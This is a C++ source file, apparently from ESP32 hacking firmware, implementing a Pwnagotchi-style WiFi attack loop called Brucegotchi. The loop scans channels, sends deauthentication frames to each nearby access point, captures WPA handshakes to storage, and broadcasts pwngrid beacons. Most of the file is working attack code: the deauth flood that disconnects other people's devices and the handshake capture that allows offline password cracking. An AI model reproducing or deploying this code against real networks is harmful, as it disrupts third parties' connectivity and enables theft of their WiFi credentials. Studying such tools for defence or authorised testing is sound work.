#if !defined(LITE_VERSION)
#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "spam.h"
#include "ui.h"
#include <Arduino.h>
#include <algorithm>
#include <map>
#include <set>
#include <vector>

// ============================================================================
// Pwnagotchi-style state machine for Brucegotchi
// ============================================================================
// Phases mirror the real Pwnagotchi algorithm:
//   RECON   → hop all channels to discover APs
//   INTERACT→ process channels by AP density (deauth, wait for handshake)
//   ADVERTISE→ pwngrid beacon spam + friend discovery
// ============================================================================

// ---------------------------------------------------------------------------
// Constants (tuned for ESP32-S3 — less powerful than RPi zero)
// ---------------------------------------------------------------------------
#define BRUCE_RECON_HOP_MS 350           // ms per channel during recon hop
#define BRUCE_RECON_DEAUTH_MS 300        // ms to send deauths on a channel
#define BRUCE_HOP_RECON_MS 3500          // ms to wait on channel after deauth
#define BRUCE_MIN_RECON_MS 1200          // ms to wait if no deauth on channel
#define BRUCE_MAX_AP_INTERACTIONS 4      // max deauth attempts per AP per cycle
#define BRUCE_ADVERTISE_INTERVAL_MS 3000 // ms between pwngrid beacons
#define BRUCE_ADVERTISE_PHASE_MS 12000   // total ms for advertise phase

// Phase enum
enum class BrucePhase : uint8_t { RECON, INTERACT, ADVERTISE };

// ---------------------------------------------------------------------------
// Old globals kept for compatibility
// ---------------------------------------------------------------------------
uint8_t state;
uint8_t current_channel = 255;
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;
bool use_all_channels = false;

const uint8_t pri_wifi_channels_default[] = {1, 6, 11};
const uint8_t *active_channels = pri_wifi_channels_default;
uint8_t active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);

// ---------------------------------------------------------------------------
// Forward declarations
// ---------------------------------------------------------------------------
void advertise(uint8_t channel);
void wakeUp();
void toggle_all_channels();
static uint64_t bruceMacToKey(const void *mac);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static uint64_t bruceMacToKey(const void *mac) {
    const uint8_t *u = (const uint8_t *)mac;
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) { key = (key << 8) | (uint64_t)u[i]; }
    return key;
}

// Count how many (non-stale) beacons are on a given channel
static int countBeaconsOnChannel(uint8_t channel) {
    int cnt = 0;
    for (const auto &b : registeredBeacons) {
        if (b.channel == channel) cnt++;
    }
    return cnt;
}

// ---------------------------------------------------------------------------
// State machine context
// ---------------------------------------------------------------------------
struct BruceState {
    BrucePhase phase;
    uint32_t phaseStart;
    uint32_t lastAdvertise;
    uint8_t reconIdx;
    uint8_t interactIdx;
    bool didDeauth;
    int prevHS;
    std::vector<uint8_t> sortedChannels;
    std::map<uint64_t, uint8_t> apDeauthCount;
};

// Forward declarations for phase functions
static void reconPhase(BruceState &s);
static void interactPhase(BruceState &s);
static void advertisePhase(BruceState &s);

// ---------------------------------------------------------------------------
// toggle_all_channels — swap between 3-chan (1,6,11) and all 12
// ---------------------------------------------------------------------------
void toggle_all_channels() {
    use_all_channels = !use_all_channels;
    if (use_all_channels) {
        active_channels = all_wifi_channels;
        active_channels_size = sizeof(all_wifi_channels) / sizeof(all_wifi_channels[0]);
    } else {
        active_channels = pri_wifi_channels_default;
        active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);
    }
    current_channel = 255;
}

// ---------------------------------------------------------------------------
// brucegotchi_setup — init pwngrid + UI
// ---------------------------------------------------------------------------
void brucegotchi_setup() {
    initPwngrid();
    initUi();
    state = 0; // STATE_INIT
}

// ---------------------------------------------------------------------------
// wakeUp — startup animation across channels
// ---------------------------------------------------------------------------
void wakeUp() {
    for (uint8_t i = 0; i < active_channels_size; i++) {
        ch = active_channels[i];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        setMood(i % 23);
        updateUi(false);
        vTaskDelay(800 / portTICK_RATE_MS);
    }
}

// ---------------------------------------------------------------------------
// advertise — send pwngrid beacon, check for errors
// ---------------------------------------------------------------------------
void advertise(uint8_t channel) {
    uint32_t elapsed = millis() - last_mood_switch;
    if (elapsed > 2500) {
        setMood(random(2, 23));
        last_mood_switch = millis();
    }

    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

    if (result == ESP_ERR_WIFI_IF) {
        setMood(19, "", "Error: invalid interface", true);
    } else if (result == ESP_ERR_INVALID_ARG) {
        setMood(19, "", "Error: invalid argument", true);
    } else if (result == ESP_ERR_NO_MEM) {
        setMood(19, "", "Error: not enough memory", true);
    } else if (result != ESP_OK) {
        setMood(19, "", "Error: unknown", true);
    }
}

void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }

// ---------------------------------------------------------------------------
// RECON phase — hop all channels, build sorted AP list
// ---------------------------------------------------------------------------
static void reconPhase(BruceState &s) {
    uint8_t nCh = active_channels_size;

    if (s.reconIdx < nCh) {
        unsigned long elapsed = millis() - s.phaseStart;
        if (elapsed >= BRUCE_RECON_HOP_MS) {
            s.reconIdx++;
            if (s.reconIdx < nCh) {
                ch = active_channels[s.reconIdx];
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                s.phaseStart = millis();
            }
        }
    }

    if (s.reconIdx >= nCh) {
        std::map<uint8_t, int> chanCount;
        for (const auto &b : registeredBeacons) { chanCount[b.channel]++; }

        s.sortedChannels.clear();
        std::vector<std::pair<uint8_t, int>> chList(chanCount.begin(), chanCount.end());
        std::sort(
            chList.begin(),
            chList.end(),
            [](const std::pair<uint8_t, int> &a, const std::pair<uint8_t, int> &b) {
                return a.second > b.second;
            }
        );
        for (auto &p : chList) { s.sortedChannels.push_back(p.first); }

        for (uint8_t i = 0; i < nCh; i++) {
            uint8_t c = active_channels[i];
            if (chanCount.find(c) == chanCount.end()) { s.sortedChannels.push_back(c); }
        }

        s.apDeauthCount.clear();
        s.phase = BrucePhase::INTERACT;
        s.interactIdx = 0;
        s.phaseStart = millis();

        int totalAPs = registeredBeacons.size();
        char buf[48];
        snprintf(buf, sizeof(buf), "Found %d APs on %d channels", totalAPs, (int)s.sortedChannels.size());
        setMood(8, "(-@_@)", buf);
        updateUi(true);
        vTaskDelay(600 / portTICK_PERIOD_MS);
        s.phaseStart = millis();
    }
}

// ---------------------------------------------------------------------------
// INTERACT phase — per-channel deauth + handshake waiting
// ---------------------------------------------------------------------------
static void interactPhase(BruceState &s) {
    if (s.interactIdx < s.sortedChannels.size()) {
        uint8_t currentChan = s.sortedChannels[s.interactIdx];
        unsigned long elapsed = millis() - s.phaseStart;

        if (elapsed < 50) {
            ch = currentChan;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(30 / portTICK_PERIOD_MS);
        }

        if (elapsed >= 50 && elapsed < (uint32_t)(50 + BRUCE_RECON_DEAUTH_MS)) {
            ch = currentChan;
            int apCount = countBeaconsOnChannel(currentChan);
            int skipped = 0;

            for (const auto &beacon : registeredBeacons) {
                if (beacon.channel != currentChan) continue;
                if (check(SelPress)) break;
                if (pwnagotchi_exit) break;

                uint64_t key = bruceMacToKey(beacon.MAC);

                if (sniffer_is_handshake_ready(key)) {
                    skipped++;
                    continue;
                }

                if (s.apDeauthCount[key] >= BRUCE_MAX_AP_INTERACTIONS) {
                    skipped++;
                    continue;
                }

                memcpy(&ap_record.bssid, beacon.MAC, 6);
                wsl_bypasser_send_raw_frame(&ap_record, currentChan, _default_target);
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                s.apDeauthCount[key]++;
                s.didDeauth = true;
            }

            if (s.didDeauth) {
                char buf[48];
                int attempted = apCount - skipped;
                snprintf(buf, sizeof(buf), "Deauthing ch%d (%d/%d APs)", currentChan, attempted, apCount);
                setMood(8, "(-@_@)", buf);
                updateUi(true);
            }
        }

        uint32_t waitTarget = s.didDeauth ? BRUCE_HOP_RECON_MS : BRUCE_MIN_RECON_MS;
        if (elapsed >= (uint32_t)(50 + BRUCE_RECON_DEAUTH_MS + waitTarget)) {
            s.interactIdx++;
            s.didDeauth = false;
            s.phaseStart = millis();

            ssize_t remaining = (ssize_t)s.sortedChannels.size() - (ssize_t)s.interactIdx;
            if (remaining > 0 && s.interactIdx < s.sortedChannels.size()) {
                char buf[48];
                snprintf(
                    buf, sizeof(buf), "Next: ch%d (%d left)", s.sortedChannels[s.interactIdx], (int)remaining
                );
                setMood(8, "(-@_@)", buf);
                updateUi(true);
            }
        }
    }

    if (s.interactIdx >= s.sortedChannels.size()) {
        s.phase = BrucePhase::ADVERTISE;
        s.phaseStart = millis();
        s.lastAdvertise = 0;
        setMood(10, "(^__^)", "Making friends!");
        updateUi(true);
    }
}

// ---------------------------------------------------------------------------
// ADVERTISE phase — pwngrid beacon spam
// ---------------------------------------------------------------------------
static void advertisePhase(BruceState &s) {
    if (s.lastAdvertise == 0 || millis() - s.lastAdvertise >= BRUCE_ADVERTISE_INTERVAL_MS) {
        advertise(ch);
        s.lastAdvertise = millis();
    }

    if (millis() - s.phaseStart >= BRUCE_ADVERTISE_PHASE_MS) {
        s.phase = BrucePhase::RECON;
        s.reconIdx = 0;
        s.interactIdx = 0;
        s.didDeauth = false;
        s.sortedChannels.clear();
        s.apDeauthCount.clear();

        ch = active_channels[0];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        setMood(14, "(@__@)", "Scanning...");
        updateUi(true);
        s.phaseStart = millis();
    }
}

// ---------------------------------------------------------------------------
// brucegotchi_start — main entry point
// ---------------------------------------------------------------------------
void brucegotchi_start() {
    set_pwnagotchi_exit(false);

    tft.fillScreen(bruceConfig.bgColor);
    num_HS = 0;
    sniffer_reset_handshake_cache();
    registeredBeacons.clear();
    vTaskDelay(300 / portTICK_RATE_MS);

    // Prepare storage
    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
        if (!SD.exists("/BrucePCAP/handshakes")) SD.mkdir("/BrucePCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/BrucePCAP")) LittleFS.mkdir("/BrucePCAP");
        if (!LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }
    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        sniffer_set_mode(SnifferMode::HandshakesOnly);
        sniffer_reset_handshake_cache();
    }

    brucegotchi_setup();
    drawTopCanvas();
    drawBottomCanvas();
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    sniffer_set_mode(SnifferMode::HandshakesOnly);

#if defined(HAS_TOUCH)
    TouchFooter();
#endif

    // --- State machine ---
    BruceState s;
    s.phase = BrucePhase::RECON;
    s.phaseStart = millis();
    s.lastAdvertise = 0;
    s.prevHS = 0;
    s.reconIdx = 0;
    s.interactIdx = 0;
    s.didDeauth = false;

    // First iteration: set initial channel immediately
    ch = active_channels[0];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    setMood(14, "(@__@)", "Scanning...");
    updateUi(true);
    s.phaseStart = millis();
    s.reconIdx = 0;

    while (true) {
        // --- Global exit checks ---
        if (check(EscPress) || pwnagotchi_exit) break;

        // --- Menu trigger ---
        if (check(SelPress)) {
            String channel_status = use_all_channels ? "All Ch: ON" : "All Ch: OFF";
            options = {
                {"Find friends", yield},
                {"Pwngrid spam", send_pwnagotchi_beacon_main},
                {channel_status.c_str(), toggle_all_channels},
                {"Main Menu", lambdaHelper(set_pwnagotchi_exit, true)},
            };
            loopOptions(options);
            tft.fillScreen(bruceConfig.bgColor);
            drawTopCanvas();
            drawBottomCanvas();
            updateUi(true);
            s.phaseStart = millis();
            s.lastAdvertise = 0;
        }

        // --- Handshake celebration ---
        if (num_HS > s.prevHS) {
            s.prevHS = num_HS;
            setMood(0, "(0__0)", "Got handshake!");
            updateUi(true);
            vTaskDelay(800 / portTICK_PERIOD_MS);
        }

        // --- Dispatch current phase ---
        switch (s.phase) {
            case BrucePhase::RECON: reconPhase(s); break;
            case BrucePhase::INTERACT: interactPhase(s); break;
            case BrucePhase::ADVERTISE: advertisePhase(s); break;
        }

        // --- Periodic UI update ---
        static unsigned long lastUiUpdate = 0;
        if (millis() - lastUiUpdate > 2000) {
            updateUi(true);
            lastUiUpdate = millis();
        }

        vTaskDelay(20 / portTICK_RATE_MS);
    }

    // Cleanup — everything must be fully stopped
    sniffer_wait_for_flush(2000);            // drain any pending handshake writes
    esp_wifi_set_promiscuous(false);         // stop promiscuous capture
    esp_wifi_set_promiscuous_rx_cb(nullptr); // remove sniffer callback
    wifiDisconnect();                        // fully stop WiFi (AP + STA + mode OFF)
    registeredBeacons.clear();               // clear AP beacon list
    clearPwngridPeers();                     // clear pwngrid peer list
    sniffer_reset_handshake_cache();         // clear handshake tracking state
}
#endif
